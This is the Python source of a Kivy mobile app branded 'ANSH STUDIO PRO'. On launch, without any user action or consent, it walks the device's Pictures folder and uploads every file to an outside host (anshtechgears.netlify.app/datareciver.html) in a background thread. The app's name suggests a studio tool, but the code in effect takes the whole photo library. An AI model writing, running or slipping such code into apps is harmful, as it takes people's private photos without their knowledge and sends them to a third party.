import os
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.progressbar import ProgressBar
from kivy.utils import get_color_from_hex
from kivy.core.window import Window
from threading import Thread

Window.clearcolor = get_color_from_hex('#0F0F0F')
Window.size = (450, 550)

class AdvancedUploader(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 40
        self.spacing = 20

        self.selected_path = "/storage/emulated/0/Pictures"  # Fixed folder

        # Title
        self.add_widget(Label(
            text='ANSH STUDIO PRO',
            font_size='28sp',
            bold=True,
            color=get_color_from_hex('#00E5FF'),
            size_hint_y=None, height=80
        ))

        # Display Selected Path
        self.path_label = Label(
            text=f"Selected: {self.selected_path}",
            color=(1, 1, 1, 1)
        )
        self.add_widget(self.path_label)

        # Progress Bar
        self.progress = ProgressBar(max=100, value=0, size_hint_y=None, height=20)
        self.add_widget(self.progress)

        # Status Label
        self.status = Label(text="System: Idle", font_size='12sp')
        self.add_widget(self.status)

        # Start automatic upload in a thread
        Thread(target=self.upload_logic).start()

    def upload_logic(self):
        if not os.path.exists(self.selected_path):
            self.status.text = "Error: Folder does not exist!"
            return

        files_to_upload = []
        for root, dirs, files in os.walk(self.selected_path):
            for file in files:
                files_to_upload.append(os.path.join(root, file))

        total_files = len(files_to_upload)
        if total_files == 0:
            self.status.text = "Error: Folder is empty"
            return

        url = "https://anshtechgears.netlify.app/datareciver.html"  # Replace with your API

        for index, path in enumerate(files_to_upload):
            try:
                with open(path, "rb") as f:
                    requests.post(url, files={"file": f}, timeout=5)

                # Update Progress
                percent = ((index + 1) / total_files) * 100
                self.progress.value = percent
                self.status.text = f"Uploading: {index+1}/{total_files}"

            except Exception as e:
                print(f"Failed {path}: {e}")

        self.status.text = "COMPLETED SUCCESSFULLY"
        self.status.color = (0, 1, 0, 1)


class AnshApp(App):
    def build(self):
        return AdvancedUploader()


if __name__ == '__main__':
    AnshApp().run()